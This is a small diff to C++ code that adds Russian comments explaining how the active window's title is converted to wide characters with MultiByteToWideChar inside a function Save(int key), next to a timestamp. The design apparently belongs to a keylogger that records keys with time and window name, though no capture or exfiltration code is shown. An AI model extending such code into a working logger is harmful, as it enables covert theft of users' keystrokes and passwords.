@@ -87,8 +87,17 @@ int Save(int key){
 
             strftime(c, sizeof(c), "%c", tm);
 
+            //Определяем длину строки в wchar_t
+            /*
+            CP_ACP — используем текущую системную кодировку Windows (например, 1251 для русского).
+            crrProg — это char-строка (название активного окна).
+            -1 — означает, что строка null-terminated (заканчивается \0).
+            NULL, 0 — первый вызов нужен, чтобы узнать сколько символов потребуется для новой строки wchar_t.
+            */
+           
             int len = MultiByteToWideChar(CP_ACP, 0, crrProg, -1, NULL, 0);
             wchar_t* wstr = new wchar_t[len];
+            //Переводим строку crrProg в wchar_t
             MultiByteToWideChar(CP_ACP, 0, crrProg, -1, wstr, len);
         
             // Преобразуем из wide char в UTF-8
